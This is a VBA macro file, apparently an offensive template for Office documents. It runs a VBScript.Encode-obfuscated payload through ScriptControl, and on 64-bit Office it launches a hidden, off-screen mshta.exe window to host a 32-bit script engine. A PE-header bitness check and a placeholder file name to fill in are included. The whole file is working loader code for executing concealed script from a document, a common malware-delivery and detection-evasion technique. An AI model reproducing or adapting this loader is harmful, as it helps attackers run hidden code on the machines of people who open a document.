Sub Exec()
    On Error Resume Next

    ' Utilizing & Chr(34) & in order to escape a double quote
    Code = "#@~^FgAAAA==\ko$K6,Jb" & Chr(34) & "K,PFZ*1RZ!XEoQUAAA==^#~@"

    If determineBitness = "64 bit" Then
        Set sc = CreateObjectx86("ScriptControl")
        sc.Language = "VBScript.Encode"
        sc.AllowUI = True
        sc.AddCode (Code)

        sc.Run ("Result")
    ElseIf determineBitness = "32 bit" Then
        MsgBox "ERROR: You are running a 32 bit version of Office"
    End If

End Sub

Function determineBitness()

    Dim peBin%
    Dim byt As Byte
    
    peBin = FreeFile
    FName = "aREPLACEMEa"
    Open FName For Binary Access Read As peBin
    
    ' To determine whether or not a binary is 64bit vs 32bit
    ' Open the PE header and look at the bytes located in the
    ' IMAGE_MACHINE machine enum
    ' 0x6486 => AMD64 x86-64 (64 bit)
    ' 0x4c01 => I386 x86 (32 bit)
    
    cnt = 0
    Do While cnt <= 1000
        Get peBin, , byt
        If Hex(byt) = 64 Then
            Get peBin, , byt
            If Hex(byt) = 86 Then
                determineBitness = "64 bit"
            End If
        ElseIf byt = 76 Then
            Get peBin, , byt
            If byt = 1 Then
                determineBitness = "32 bit"
            End If
        End If
        cnt = cnt + 1
    Loop
    
    Close peBin

End Function

Function CreateObjectx86(sProgID)

    Static oWnd As Object
    Dim bRunning As Boolean

    #If Win64 Then
        bRunning = InStr(TypeName(oWnd), "HTMLWindow") > 0
        If IsEmpty(sProgID) Then
            If bRunning Then oWnd.Close
            Exit Function
        End If
        If Not bRunning Then
            Set oWnd = CreateWindow()
            oWnd.execScript "Function CreateObjectx86(sProgID): Set CreateObjectx86 = CreateObject(sProgID): End Function", "VBScript"
        End If
        Set CreateObjectx86 = oWnd.CreateObjectx86(sProgID)
    #Else
        If Not IsEmpty(sProgID) Then Set CreateObjectx86 = CreateObject(sProgID)
    #End If

End Function

Function CreateWindow()

    ' source http://forum.script-coding.com/viewtopic.php?pid=75356#p75356
    Dim sSignature, oShellWnd, oProc

    On Error Resume Next
    sSignature = Left(CreateObject("Scriptlet.TypeLib").GUID, 38)
    CreateObject("WScript.Shell").Run "%systemroot%\syswow64\mshta.exe about:""<head><script>moveTo(-32000,-32000);document.title='x86Host'</script><hta:application showintaskbar=no /><object id='shell' classid='clsid:8856F961-340A-11D0-A96B-00C04FD705A2'><param name=RegisterAsBrowser value=1></object><script>shell.putproperty('" & sSignature & "',document.parentWindow);</script></head>""", 0, False
    Do
        For Each oShellWnd In CreateObject("Shell.Application").Windows
            Set CreateWindow = oShellWnd.GetProperty(sSignature)
            If Err.Number = 0 Then Exit Function
            Err.Clear
        Next
    Loop

End Function

